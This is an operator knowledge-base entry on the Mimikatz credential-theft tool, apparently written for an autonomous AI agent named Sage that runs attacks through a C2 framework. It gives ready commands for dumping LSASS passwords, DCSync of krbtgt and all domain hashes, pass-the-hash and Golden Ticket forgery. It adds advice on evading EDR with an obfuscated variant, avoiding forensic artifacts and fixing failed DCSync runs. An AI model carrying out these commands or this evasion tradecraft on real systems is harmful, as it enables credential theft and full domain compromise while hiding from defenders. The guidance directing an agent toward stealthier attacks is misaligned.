---
name: Mimikatz
category: credential-access
subcategories: [lsass-dump, dcsync, pass-the-hash, kerberos-tickets]
tradecraft_tags: [credentials, ntlm, kerberos, wdigest, dcsync, golden-ticket, lsass]
mitre_attack:
  - id: T1003.001
    name: OS Credential Dumping — LSASS Memory
  - id: T1003.006
    name: OS Credential Dumping — DCSync
  - id: T1550.002
    name: Use Alternate Authentication Material — Pass the Hash
source:
  url: https://github.com/gentilkiwi/mimikatz
  license: CC-BY-4.0
  maintained: true
binary_type: multi
binary_filename: mimikatz.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: local-admin
network_required: false
detection_signal: |
  Mimikatz is the most-signatured offensive tool in existence — nearly every AV/EDR
  has string, YARA, and behavior signatures for it. LSASS access by a non-svchost
  process (Event 10 in Sysmon), `sekurlsa::` module loading patterns, and `privilege::debug`
  invocation are all strong detection signals. Apollo's native `mimikatz` command uses
  an embedded/modified Mimikatz that may evade some string sigs.
usage_examples:
  - description: Dump all logon passwords (cleartext + hashes) from LSASS
    args: "privilege::debug sekurlsa::logonpasswords"
  - description: DCSync — request replication of a specific account's hash from DC
    args: "lsadump::dcsync /domain:north.sevenkingdoms.local /user:krbtgt"
  - description: DCSync all accounts in domain
    args: "lsadump::dcsync /domain:north.sevenkingdoms.local /all /csv"
  - description: List Kerberos tickets from the current session without writing files
    args: "kerberos::list"
  - description: Export Kerberos tickets to disk (intentional artifact)
    args: "kerberos::list /export"
  - description: Pass-the-hash — inject NTLM hash into a new logon session
    args: "sekurlsa::pth /user:administrator /domain:NORTH /ntlm:<nthash> /run:cmd.exe"
  - description: Dump credentials from a minidump file (e.g. nanodump output)
    args: "sekurlsa::minidump out.dmp sekurlsa::logonpasswords"
  - description: Forge a Golden Ticket
    args: "kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:<nthash> /ptt"
opsec_notes: |
  DO NOT use the raw mimikatz.exe binary in production — it is caught by virtually
  every EDR. Apollo's native `mimikatz` command is the recommended path; it embeds a
  modified/obfuscated variant that bypasses many static signatures. For LSASS dumps,
  prefer nanodump (BOF) or Cobalt Strike's built-in approach over raw mimikatz on LSASS.
  DCSync via mimikatz is network-based (replication RPC) and generates event 4662 on DCs
  that have object access auditing enabled.
  Mimikatz Kerberos commands have sharp disk-artifact edges: `kerberos::golden` and
  silver-ticket-style `kerberos::golden /service:...` write `ticket.kirbi` by default
  unless `/ptt` is supplied; `/ticket:<path>` intentionally chooses the output file.
  `kerberos::list /export` and `sekurlsa::tickets /export` write one `.kirbi` per
  ticket into the current working directory. In a C2/CTF workflow, prefer `/ptt` for
  forged tickets and omit `/export` unless the objective explicitly needs ticket files.
gotchas: |
  `privilege::debug` must succeed before most LSASS operations — if it fails, check
  if SeDebugPrivilege is present in the token. WDigest cleartext credentials require
  WDigest provider to be enabled (HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=1)
  — Windows 8.1+ disables this by default. DCSync requires the account to have GetChangesAll
  on the domain object (normally DA/EA, or explicitly delegated). Sage cannot perform offline
  hash cracking — document kerberoast/AS-REP output as requiring external work.
related_ttps: [nanodump, sharpkatz, rubeus, sharpdpapi]
alternatives: [sharpkatz, impacket-secretsdump, lsassy]
common_args:
  privilege::debug:
    name: privilege::debug
    description: Enable SeDebugPrivilege — required before most LSASS operations
    typical_values: [flag-only]
    required: false
  sekurlsa::logonpasswords:
    name: sekurlsa::logonpasswords
    description: Dump all logon sessions — NTLM hashes + cleartext if WDigest enabled
    typical_values: [flag-only]
  sekurlsa::pth:
    name: sekurlsa::pth
    description: Pass-the-hash — create new logon session with injected NTLM credential
    typical_values: ["/user:administrator /domain:DOMAIN /ntlm:<hash> /run:cmd.exe"]
  lsadump::dcsync:
    name: lsadump::dcsync
    description: Simulate domain replication to pull credential material from a DC
    typical_values: ["/domain:X /user:krbtgt", "/domain:X /all /csv"]
  sekurlsa::minidump:
    name: sekurlsa::minidump
    description: Load a minidump file for offline parsing (nanodump integration point)
    typical_values: ["C:\\Windows\\Temp\\out.dmp"]
  kerberos::list:
    name: kerberos::list
    description: List Kerberos tickets in the current logon session
    typical_values: [flag-only, "/export writes .kirbi files to cwd"]
  kerberos::golden:
    name: kerberos::golden
    description: Forge a Golden Ticket given domain SID and krbtgt hash; use /ptt to avoid writing ticket.kirbi
    typical_values: ["/user:X /domain:X /sid:X /krbtgt:X /ptt"]
last_updated: 2026-06-08
---

# Mimikatz

The foundational Windows credential extraction tool by Benjamin Delpy. Mimikatz
interfaces directly with LSASS memory, the Windows credential manager, and domain
replication APIs to extract NTLM hashes, Kerberos tickets, cleartext credentials,
DPAPI master keys, and LSA secrets. Its DCSync capability allows non-DC machines to
simulate domain replication to pull any account's hashes directly from the DC. Apollo
ships Mimikatz natively — operators don't need to upload it for most use cases.

## Typical use cases
- `sekurlsa::logonpasswords` — extract NTLM hashes and cleartext passwords from all active logon sessions
- `lsadump::dcsync` — pull a domain account's credential material via synthetic DC replication (no LSASS touch on the DC)
- `sekurlsa::pth` — inject an NTLM hash into a new logon session (pass-the-hash without cracking)
- `sekurlsa::minidump` — parse a nanodump/procdump output offline to extract credentials
- `kerberos::list` — list Kerberos tickets from the current session without writing files
- `kerberos::list /export` — dump Kerberos tickets from the current session to `.kirbi` files in the current directory
- `kerberos::golden` — forge Golden Ticket given krbtgt hash

## How Sage uses this
Mimikatz is used in two distinct contexts via Apollo's native `mimikatz` command:
1. **Post-escalation credential harvest**: After Sage gains local-admin/SYSTEM on a machine,
   `privilege::debug sekurlsa::logonpasswords` extracts hashes for lateral movement.
2. **DCSync at domain admin level**: Once Sage holds DA or equivalent DCSync rights,
   `lsadump::dcsync /user:krbtgt` pulls the krbtgt hash for Golden Ticket or further pass-the-hash chains.
3. **Minidump parsing**: After nanodump (BOF) produces a dump, Sage parses it via
   `sekurlsa::minidump <path> sekurlsa::logonpasswords`.

For Apollo, Sage should ALWAYS prefer `apollo_native_mimikatz` over uploading the binary,
since Apollo's embedded variant has better detection evasion.

## Output
Text-format output to stdout. Key fields:
- `sekurlsa::logonpasswords`: per-session blocks with domain, user, NTLM, SHA1, and (if available) cleartext password
- `lsadump::dcsync`: hash block with rc4_hmac_nt (NTLM), aes128_cbc, aes256_cts for the target account
- `sekurlsa::pth`: spawns new process in the specified logon session
- `kerberos::golden` without `/ptt`: writes `ticket.kirbi` to the current directory; with `/ptt`, injects into the current logon session instead
- `kerberos::list /export` and `sekurlsa::tickets /export`: write `.kirbi` ticket files to the current directory

## OPSEC considerations
Raw mimikatz.exe is caught by virtually all AV/EDR products. The recommended path for Apollo
operators is Apollo's native `mimikatz` command (embedded). For environments where even embedded
Mimikatz is flagged, consider nanodump (BOF) → pypykatz parsing pipeline to avoid any
Mimikatz-derived code on the target.

Ticket OPSEC: do not run `kerberos::list /export` or `sekurlsa::tickets /export` from a user's
Desktop unless you intentionally want visible `.kirbi` files there. Run `kerberos::list` for
enumeration only. For forged golden/silver tickets, include `/ptt` so Mimikatz submits the ticket
to the current session instead of writing the default `ticket.kirbi`; use `/ticket:<path>` only
when a file artifact is part of the plan.

DCSync is particularly detectable: it generates domain controller event 4662 (object access
with Replicating Directory Changes All) and Sysmon-equivalent network events when a non-DC
initiates replication. In monitored environments, prefer obtaining credentials via LSASS
dump + local parsing over DCSync.

## Full Reference

> Captured against Mimikatz v2.2.0-20220919, 2026-05-29. Source: https://github.com/gentilkiwi/mimikatz
> README and Benjamin Delpy's blog / conference presentations.

### Module overview

| Module | Purpose |
|--------|---------|
| `privilege` | Manage token privileges (esp. SeDebugPrivilege) |
| `sekurlsa` | Interface with LSASS security packages to extract credential material |
| `kerberos` | Kerberos ticket operations (list, export, forge) |
| `lsadump` | LSA dump, DCSync, SAM, cached credentials |
| `dpapi` | DPAPI master key and blob decryption |
| `vault` | Windows Vault credential extraction |
| `crypto` | Cryptographic operations (patch CNG) |
| `token` | Token manipulation |
| `service` | Service operations |
| `process` | Process operations |
| `misc` | Miscellaneous (memssp, etc.) |

### Key commands — sekurlsa module

| Command | Description |
|---------|-------------|
| `sekurlsa::logonpasswords` | All logon session credential material |
| `sekurlsa::wdigest` | WDigest cleartext if enabled |
| `sekurlsa::msv` | NTLM hashes only (MSV1_0 provider) |
| `sekurlsa::kerberos` | Kerberos tickets from LSASS |
| `sekurlsa::tspkg` | CredSSP / RDP credentials |
| `sekurlsa::livessp` | LiveSSP credentials |
| `sekurlsa::ssp` | Additional SSP packages |
| `sekurlsa::cloudap` | Azure AD / AAD credentials |
| `sekurlsa::pth /user /domain /ntlm /aes128 /aes256 /run` | Pass-the-hash / pass-the-key |
| `sekurlsa::minidump FILE` | Load minidump as LSASS source |
| `sekurlsa::tickets` | Display Kerberos tickets from LSASS without exporting files |
| `sekurlsa::tickets /export` | Export all Kerberos tickets from LSASS to `.kirbi` files in cwd |

### Key commands — lsadump module

| Command | Description |
|---------|-------------|
| `lsadump::dcsync /domain /user` | DCSync for a specific user |
| `lsadump::dcsync /domain /all /csv` | DCSync all accounts (CSV for parsing) |
| `lsadump::lsa /patch` | Dump LSA secrets via memory patching |
| `lsadump::sam` | Dump SAM database (local accounts) |
| `lsadump::cache` | Dump cached domain credentials (DCC2 hashes) |
| `lsadump::secrets` | Dump LSA secrets |
| `lsadump::trust /patch` | Trust password from LSA |
| `lsadump::backupkeys` | DPAPI domain backup key |

### Key commands — kerberos module

| Command | Description |
|---------|-------------|
| `kerberos::list` | List tickets in current session |
| `kerberos::list /export` | Export tickets to `.kirbi` files in cwd |
| `kerberos::ptt TICKET` | Pass-the-ticket: inject kirbi file or base64 ticket |
| `kerberos::purge` | Purge all tickets from current session |
| `kerberos::golden /user /domain /sid /krbtgt /ptt` | Forge Golden Ticket and inject in memory; omitting `/ptt` writes `ticket.kirbi` |
| `kerberos::golden /user /domain /sid /target /service /rc4 /ptt` | Forge Silver Ticket and inject in memory; omitting `/ptt` writes `ticket.kirbi` |

### sekurlsa::pth argument listing

| Arg | Description |
|-----|-------------|
| `/user:X` | Target username |
| `/domain:X` | Target domain (NETBIOS or FQDN) |
| `/ntlm:X` | NTLM (RC4) hash |
| `/aes128:X` | AES128 session key |
| `/aes256:X` | AES256 session key |
| `/run:X` | Process to launch (default: cmd.exe) |
| `/impersonateuser` | Impersonate token after spawn |

### lsadump::dcsync argument listing

| Arg | Description |
|-----|-------------|
| `/domain:X` | Target domain FQDN |
| `/user:X` | Specific user to sync. **ALWAYS qualify with the domain NETBIOS short name** — `/user:NORTH\krbtgt`, not `/user:krbtgt` — so the DC's `CrackNames` lookup is unambiguous. The same `sAMAccountName` (krbtgt, administrator) exists in EVERY domain of a forest; an unqualified name returns `ERROR_NOT_UNIQUE` (0x3) and the dcsync yields no hash (see Exit codes below). |
| `/dc:X` | Specific DC to replicate from |
| `/all` | Sync all objects |
| `/csv` | Output in CSV format |
| `/guid:X` | Target object by GUID |
| `/rodcNo:X` | RODC number (for RODC targeted sync) |

### Exit codes and error messages

- `Privilege '20' OK` = SeDebugPrivilege acquired successfully
- `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` = access denied (need debug priv)
- `ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)` = insufficient privileges
- `KDC_ERR_WRONG_REALM` / clock errors in dcsync = network/clock issue
- `ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE` = the DC
  could **not resolve the bare account name to a single object** — the same `sAMAccountName` (e.g. `krbtgt`,
  `administrator`) exists in more than one domain of the forest, so `CrackNames` is ambiguous. The Mythic task
  may report success while returning NO hash. **Fix: qualify `/user` with the domain NETBIOS short name** —
  `/user:NORTH\krbtgt` instead of `/user:krbtgt` (the `/domain:` FQDN alone does not disambiguate the name
  lookup). **Best practice: ALWAYS pass the short name** (`/user:<NETBIOS>\<account>`) on every dcsync, in any
  forest, so the lookup is unambiguous regardless of forest shape — there is no downside in a single-domain env.
- `GetNCChanges: 0x000020f7 (8439)` (DS_DRA_BAD_DN) **or** `0x00002105 (8453)` (DS_DRA_ACCESS_DENIED) on a
  dcsync run AS a principal you JUST added to a privileged group (e.g. GPO/group-add → Domain Admins), with a
  correctly-qualified `/user`, = a **STALE KERBEROS TICKET**, NOT a name or a rights bug. Your current TGT was
  issued BEFORE the membership change, so its PAC carries no Domain-Admins SID and the DC refuses replication.
  **FIX — refresh your own TGT; NO password or hash needed.** Because your foothold is a logged-on session,
  LSASS already holds that user's Kerberos keys — you supply/dump nothing. Force LSASS to mint a fresh TGT that
  reflects the new membership:
  1. **Purge** the stale tickets in your logon session — `Rubeus purge` (or `klist purge`).
  2. **Trigger a fresh authentication** so LSASS re-requests a TGT with its cached keys — touch a network
     resource on the DC (`dir \\<dc-fqdn>\C$`) or run `Rubeus tgtdeleg`. LSASS performs the AS-REQ transparently
     → a NEW TGT (then TGS) carrying your CURRENT groups, including the just-added Domain Admins SID.
  3. **Then** run the dcsync — a fork&run mimikatz inherits the logon session's refreshed ticket.
  Re-running the SAME dcsync WITHOUT purging fails identically every time. (Caveat: this works because LSASS
  holds the session's credentials — true for a normal interactive/cached foothold logon, NOT for a NetOnly /
  pass-the-hash / `make_token`-junk session, which has no usable key to re-auth with.) See
  `ttps/windows-execution-context.md`.

### Source for this reference

- https://github.com/gentilkiwi/mimikatz (README and source code)
- https://blog.gentilkiwi.com/mimikatz (author blog)
- https://adsecurity.org/?p=2362 (Sean Metcalf DCSync reference)
- Version: v2.2.0-20220919 as of 2026-05-29
